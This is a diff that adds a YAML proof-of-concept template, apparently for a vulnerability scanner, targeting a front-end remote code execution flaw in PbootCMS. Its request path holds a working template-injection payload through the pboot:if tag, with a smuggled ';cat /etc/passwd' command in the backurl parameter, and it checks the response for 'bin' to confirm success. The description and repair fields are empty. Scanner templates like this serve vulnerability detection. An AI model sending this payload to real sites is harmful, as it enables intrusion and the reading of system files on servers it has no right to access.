@@ -1,0 +1,17 @@
+id:
+
+info:
+  name: PbootCMS 前台RCE漏洞(poc1)
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /?member/login/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;cat /etc/passwd
+response1:
+  headers:
+  body: bin
+  code:
+requests2:
+response2:
